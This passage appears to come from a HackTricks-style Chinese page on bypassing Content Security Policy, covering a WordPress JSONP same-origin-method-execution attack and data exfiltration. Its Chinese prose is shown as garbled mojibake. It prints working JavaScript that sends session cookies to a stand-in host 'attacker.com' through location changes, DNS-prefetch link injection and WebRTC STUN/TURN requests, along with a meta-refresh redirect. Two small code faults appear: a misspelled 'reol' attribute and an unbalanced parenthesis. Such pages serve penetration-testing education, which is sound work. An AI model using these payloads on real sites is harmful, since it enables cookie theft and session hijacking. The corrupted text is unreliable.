{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

æ­¤å¤–ï¼Œ**wordpress** åœ¨ `/wp-json/wp/v2/users/1?_jsonp=data` æœ‰ä¸€ä¸ª **JSONP** ç«¯ç‚¹ï¼Œå®ƒä¼š**åå°„**è¾“å‡ºä¸­å‘é€çš„**æ•°æ®**ï¼ˆä»…é™å­—æ¯ã€æ•°å­—å’Œç‚¹çš„é™åˆ¶ï¼‰ã€‚

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥ç«¯ç‚¹å¯¹ WordPress å‘èµ· SOME æ”»å‡»ï¼Œå¹¶å°†å…¶åµŒå…¥ `<script src="/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` ä¸­ï¼Œè¯·æ³¨æ„ï¼Œè¿™ä¸ª**è„šæœ¬**ä¼šè¢«**åŠ è½½**ï¼Œå› ä¸ºå®ƒè¢« 'self' **å…è®¸**ã€‚æ­¤å¤–ï¼Œç”±äºå®‰è£…äº† WordPressï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡**æ˜“å—æ”»å‡»çš„** **å›è°ƒ**ç«¯ç‚¹æ»¥ç”¨**SOME æ”»å‡»**ï¼Œè¯¥ç«¯ç‚¹**ç»•è¿‡ CSP**ï¼Œä»¥æé«˜ç”¨æˆ·æƒé™ï¼Œå®‰è£…æ–°æ’ä»¶ç­‰ã€‚\
æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP æ•°æ®æ³„éœ²ç»•è¿‡

å¦‚æœæœ‰ä¸€ä¸ªä¸¥æ ¼çš„ CSP ä¸å…è®¸ä½ **ä¸å¤–éƒ¨æœåŠ¡å™¨äº¤äº’**ï¼Œä½ æ€»æ˜¯å¯ä»¥åšä¸€äº›äº‹æƒ…æ¥æ³„éœ²ä¿¡æ¯ã€‚

### Location

ä½ å¯ä»¥æ›´æ–°ä½ç½®ï¼Œå°†ç§˜å¯†ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta æ ‡ç­¾

æ‚¨å¯ä»¥é€šè¿‡æ³¨å…¥ meta æ ‡ç­¾æ¥è¿›è¡Œé‡å®šå‘ï¼ˆè¿™åªæ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œä¸ä¼šæ³„éœ²å†…å®¹ï¼‰
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS é¢„è·å–

ä¸ºäº†åŠ å¿«é¡µé¢åŠ è½½é€Ÿåº¦ï¼Œæµè§ˆå™¨ä¼šé¢„å…ˆå°†ä¸»æœºåè§£æä¸º IP åœ°å€å¹¶ç¼“å­˜èµ·æ¥ä»¥ä¾›åç»­ä½¿ç”¨ã€‚\
ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŒ‡ç¤ºæµè§ˆå™¨é¢„è§£æä¸»æœºåï¼š`<link reol="dns-prefetch" href="something.com">`

ä½ å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºé€šè¿‡ DNS è¯·æ±‚**æ³„éœ²æ•æ„Ÿä¿¡æ¯**ï¼š
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
å¦ä¸€ç§æ–¹æ³•ï¼š
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå‘ç”Ÿï¼ŒæœåŠ¡å™¨å¯ä»¥å‘é€HTTPå¤´ï¼š
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
æ˜¾ç„¶ï¼Œè¿™é¡¹æŠ€æœ¯åœ¨æ— å¤´æµè§ˆå™¨ï¼ˆæœºå™¨äººï¼‰ä¸­ä¸èµ·ä½œç”¨
{% endhint %}

### WebRTC

åœ¨å¤šä¸ªé¡µé¢ä¸Šï¼Œæ‚¨å¯ä»¥é˜…è¯»åˆ° **WebRTC ä¸æ£€æŸ¥ CSP çš„ `connect-src` ç­–ç•¥**ã€‚

å®é™…ä¸Šï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ _DNS è¯·æ±‚_ æ¥ _æ³„éœ²_ ä¿¡æ¯ã€‚æŸ¥çœ‹ä»¥ä¸‹ä»£ç ï¼š
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
å¦ä¸€ä¸ªé€‰é¡¹ï¼š
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
## åœ¨çº¿æ£€æŸ¥CSPç­–ç•¥

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## è‡ªåŠ¨åˆ›å»ºCSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## å‚è€ƒèµ„æ–™

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)

â€‹

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢æ´å¯Ÿ**\
æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œæ´å¯Ÿï¼Œä¿æŒä¸å¿«èŠ‚å¥é»‘å®¢ä¸–ç•Œçš„åŒæ­¥

**æœ€æ–°å…¬å‘Š**\
é€šè¿‡æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œå…³é”®å¹³å°æ›´æ–°ï¼Œä¿æŒä¿¡æ¯çš„æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) å¹¶å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRï¼Œåˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
